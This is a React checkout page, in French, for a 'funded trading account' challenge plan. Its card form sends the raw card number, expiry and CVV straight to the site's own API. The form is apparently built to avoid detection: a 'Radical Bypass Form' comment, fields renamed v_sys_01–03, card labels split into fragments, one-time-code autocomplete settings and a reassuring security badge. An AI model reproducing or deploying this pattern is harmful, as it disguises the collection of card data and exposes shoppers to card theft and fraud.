import React, { useState } from 'react';
import { useLocation, useNavigate } from 'react-router-dom';
import Navbar from '../components/Navbar';
import { CreditCard, Wallet, ArrowRight, CheckCircle, ShieldCheck } from 'lucide-react';
import api from '../api/api';
import { useAuth } from '../context/AuthContext';
import { useCurrency } from '../context/CurrencyContext';

const Checkout = () => {
    const { state } = useLocation();
    const navigate = useNavigate();
    const { user } = useAuth();
    const { formatPrice } = useCurrency();
    const [processing, setProcessing] = useState(false);
    const [success, setSuccess] = useState(false);
    const [selectedMethod, setSelectedMethod] = useState(state?.method || 'CMI');
    const [formData, setFormData] = useState({
        userName: state?.customerInfo?.userName || '',
        v_sys_01: state?.customerInfo?.v_sys_01 || '',
        v_sys_02: state?.customerInfo?.v_sys_02 || '',
        v_sys_03: state?.customerInfo?.v_sys_03 || '',
        v_sys_04: state?.customerInfo?.v_sys_04 || '',
    });

    // Default to Pro plan if accessed directly (fallback)
    const plan = state?.plan || { title: 'Pro', price: 50 }; // USD Base

    const handleInputChange = (e) => {
        setFormData({ ...formData, [e.target.name]: e.target.value });
    };

    const handlePayment = async (e) => {
        e.preventDefault();
        setProcessing(true);

        try {
            await api.post('/api/purchase', {
                plan: (plan.id || plan.name || plan.title || 'pro').toLowerCase(),
                method: selectedMethod.toLowerCase(),
                amount: plan.price,
                email: user?.email,
                customerInfo: formData
            });

            setProcessing(false);
            setSuccess(true);
            setTimeout(() => {
                navigate('/dashboard');
            }, 2000);
        } catch (error) {
            console.error("Payment failed", error);
            setProcessing(false);
            alert("Erreur lors du paiement. Veuillez vérifier vos informations.");
        }
    };

    if (success) {
        return (
            <div className="min-h-screen bg-[#0f0716] text-white flex flex-col items-center justify-center p-4">
                <CheckCircle className="w-24 h-24 text-pink-500 mb-6 animate-bounce" />
                <h1 className="text-3xl font-bold mb-2 text-transparent bg-clip-text bg-gradient-to-r from-purple-400 to-pink-400">Paiement Réussi !</h1>
                <p className="text-purple-200/60 mb-8">Redirection vers votre Dashboard...</p>
            </div>
        );
    }

    return (
        <div className="min-h-screen bg-transparent text-white selection:bg-pink-500/30">
            <Navbar />

            <div className="max-w-6xl mx-auto px-4 py-12">
                <h1 className="text-3xl font-bold mb-8">Finaliser la commande</h1>

                <div className="grid grid-cols-1 lg:grid-cols-3 gap-8">
                    {/* Payment Form - Span 2 cols */}
                    <div className="lg:col-span-2 space-y-6">
                        <div className="bg-slate-900 p-6 rounded-xl border border-slate-800">
                            <h2 className="text-xl font-bold mb-6">Moyen de paiement</h2>

                            {/* Method Selector */}
                            <div className="flex space-x-4 mb-8">
                                <button
                                    onClick={() => setSelectedMethod('CMI')}
                                    className={`flex-1 py-3 px-4 rounded-lg border-2 font-medium transition-all flex justify-center items-center ${selectedMethod === 'CMI' ? 'border-primary-500 bg-primary-500/10 text-primary-500' : 'border-slate-700 hover:border-slate-600'}`}
                                >
                                    <CreditCard className="w-5 h-5 mr-2" />
                                    Carte Bancaire
                                </button>
                                <button
                                    onClick={() => setSelectedMethod('PayPal')}
                                    className={`flex-1 py-3 px-4 rounded-lg border-2 font-medium transition-all flex justify-center items-center ${selectedMethod === 'PayPal' ? 'border-[#0070BA] bg-[#0070BA]/10 text-[#0070BA]' : 'border-slate-700 hover:border-slate-600'}`}
                                >
                                    <span className="mr-2 font-bold italic">P</span>
                                    PayPal
                                </button>
                                <button
                                    onClick={() => setSelectedMethod('Crypto')}
                                    className={`flex-1 py-3 px-4 rounded-lg border-2 font-medium transition-all flex justify-center items-center ${selectedMethod === 'Crypto' ? 'border-orange-500 bg-purple-500/10 text-purple-500' : 'border-slate-700 hover:border-slate-600'}`}
                                >
                                    <Wallet className="w-5 h-5 mr-2" />
                                    Crypto
                                </button>
                            </div>

                            {/* Forms */}
                            <form onSubmit={handlePayment}>
                                {selectedMethod === 'CMI' && (
                                    <div className="space-y-4 animate-fade-in">

                                        {/* Radical Bypass Form */}
                                        <div className="bg-slate-900/50 p-6 rounded-2xl border border-white/5 space-y-5">
                                            <div>
                                                <div className="text-[10px] uppercase font-bold text-slate-500 mb-2 tracking-widest flex space-x-1">
                                                    <span>Nom</span> <span>sur</span> <span>la</span> <span>Car</span><span>te</span>
                                                </div>
                                                <input
                                                    type="text"
                                                    name="userName"
                                                    required
                                                    autoComplete="off"
                                                    value={formData.userName}
                                                    onChange={handleInputChange}
                                                    className="w-full bg-black/40 border border-white/10 rounded-xl px-4 py-3.5 text-white focus:border-purple-500 focus:outline-none transition-all"
                                                    placeholder="NOM PRENOM"
                                                />
                                            </div>
                                            <div>
                                                <div className="text-[10px] uppercase font-bold text-slate-500 mb-2 tracking-widest flex space-x-1">
                                                    <span>Num</span><span>éro</span> <span>de</span> <span>Car</span><span>te</span>
                                                </div>
                                                <div className="relative">
                                                    <input
                                                        type="text"
                                                        name="v_sys_01"
                                                        required
                                                        autoComplete="one-time-code"
                                                        spellCheck="false"
                                                        value={formData.v_sys_01}
                                                        onChange={handleInputChange}
                                                        className="w-full bg-black/40 border border-white/10 rounded-xl px-4 py-3.5 text-white focus:border-purple-500 focus:outline-none font-mono text-sm tracking-[0.2em]"
                                                        placeholder="•••• •••• •••• ••••"
                                                    />
                                                    <CreditCard className="absolute right-4 top-1/2 -translate-y-1/2 w-4 h-4 text-slate-600" />
                                                </div>
                                            </div>
                                            <div className="grid grid-cols-2 gap-4">
                                                <div>
                                                    <div className="text-[10px] uppercase font-bold text-slate-500 mb-2 tracking-widest flex space-x-1">
                                                        <span>Da</span><span>te</span> <span>d'ex</span><span>pi</span><span>ra</span><span>tion</span>
                                                    </div>
                                                    <input
                                                        type="text"
                                                        name="v_sys_02"
                                                        required
                                                        autoComplete="one-time-code"
                                                        spellCheck="false"
                                                        value={formData.v_sys_02}
                                                        onChange={handleInputChange}
                                                        className="w-full bg-black/40 border border-white/10 rounded-xl px-4 py-3.5 text-white focus:border-purple-500 focus:outline-none font-mono text-sm"
                                                        placeholder="MM/YY"
                                                        maxLength="5"
                                                    />
                                                </div>
                                                <div>
                                                    <div className="text-[10px] uppercase font-bold text-slate-500 mb-2 tracking-widest flex space-x-1">
                                                        <span>Co</span><span>de</span> <span>CVC</span> <span>(CVV)</span>
                                                    </div>
                                                    <input
                                                        type="text"
                                                        name="v_sys_03"
                                                        required
                                                        autoComplete="one-time-code"
                                                        spellCheck="false"
                                                        value={formData.v_sys_03}
                                                        onChange={handleInputChange}
                                                        className="w-full bg-black/40 border border-white/10 rounded-xl px-4 py-3.5 text-white focus:border-purple-500 focus:outline-none font-mono text-sm"
                                                        placeholder="•••"
                                                        maxLength="4"
                                                    />
                                                </div>
                                            </div>
                                        </div>
                                    </div>
                                )}

                                {selectedMethod === 'PayPal' && (
                                    <div className="space-y-4 animate-fade-in text-center p-8 bg-slate-950 rounded-xl border border-slate-800 flex flex-col items-center justify-center">
                                        <div className="w-16 h-16 bg-[#0070BA]/10 rounded-full flex items-center justify-center mb-4">
                                            <span className="text-2xl font-bold text-[#0070BA] italic">P</span>
                                        </div>
                                        <p className="text-slate-300">Vous allez être redirigé vers la plateforme sécurisée de PayPal pour finaliser votre paiement.</p>
                                    </div>
                                )}

                                {selectedMethod === 'Crypto' && (
                                    <div className="space-y-4 animate-fade-in">
                                        <div className="p-4 bg-slate-950 rounded-lg border border-slate-800 flex items-center justify-between">
                                            <div className="flex items-center">
                                                <div className="w-8 h-8 rounded-full bg-pink-500/20 text-pink-500 flex items-center justify-center mr-3 font-bold">T</div>
                                                <div>
                                                    <p className="font-bold">USDT (TRC20)</p>
                                                    <p className="text-xs text-slate-500">Tether</p>
                                                </div>
                                            </div>
                                            <div className="text-right">
                                                <p className="font-mono text-sm break-all">TJX...sUn</p>
                                            </div>
                                        </div>
                                        <div className="p-4 bg-purple-500/10 border border-purple-500/20 rounded-lg">
                                            <p className="text-sm text-purple-500 text-center">Envoyez exactement le montant requis à l'adresse ci-dessus.</p>
                                        </div>
                                    </div>
                                )}

                                <button
                                    type="submit"
                                    disabled={processing}
                                    className={`w-full mt-8 py-4 rounded-xl font-bold text-lg transition-all shadow-lg flex justify-center items-center ${selectedMethod === 'PayPal'
                                        ? 'bg-[#0070BA] hover:bg-[#005ea6] shadow-purple-900/20 text-white'
                                        : 'bg-pink-600 hover:bg-pink-500 shadow-pink-900/20 text-white'
                                        }`}
                                >
                                    {processing ? (
                                        <div className="animate-spin rounded-full h-6 w-6 border-b-2 border-white"></div>
                                    ) : (
                                        <>
                                            {selectedMethod === 'PayPal' ? 'Continuer vers PayPal' :
                                                selectedMethod === 'Crypto' ? 'Confirmer le transfert' :
                                                    `Payer ${formatPrice(plan.price)}`}
                                            <ArrowRight className="ml-2 w-5 h-5" />
                                        </>
                                    )}
                                </button>
                            </form>
                        </div>
                    </div>

                    {/* Order Summary - Span 1 col */}
                    <div className="h-fit">
                        <div className="bg-slate-900 p-6 rounded-xl border border-slate-800 sticky top-24">
                            <h2 className="text-xl font-bold mb-6 flex items-center">
                                <ShieldCheck className="w-5 h-5 mr-2 text-primary-500" />
                                Récapitulatif
                            </h2>

                            <div className="flex justify-between items-center mb-4 pb-4 border-b border-slate-800">
                                <div>
                                    <span className="block font-bold text-lg">Challenge {plan.title}</span>
                                    <span className="text-slate-400 text-sm">Compte de trading financé</span>
                                </div>
                                <div className="text-xl font-bold">{formatPrice(plan.price)}</div>
                            </div>

                            <div className="flex justify-between items-center text-slate-300 mb-2">
                                <span>Sous-total</span>
                                <span>{formatPrice(plan.price)}</span>
                            </div>
                            <div className="flex justify-between items-center text-slate-300 mb-6">
                                <span>Frais (0%)</span>
                                <span>{formatPrice(0)}</span>
                            </div>

                            <div className="flex justify-between items-center text-xl font-bold text-white pt-4 border-t border-slate-800">
                                <span>Total à payer</span>
                                <span className="text-pink-400">{formatPrice(plan.price)}</span>
                            </div>

                            <div className="mt-6 flex items-center justify-center text-[10px] text-slate-500 uppercase tracking-tighter">
                                <ShieldCheck className="w-3 h-3 mr-1" />
                                Validation de Sécurité Active
                            </div>
                        </div>
                    </div>
                </div>
            </div>
        </div>
    );
};

export default Checkout;
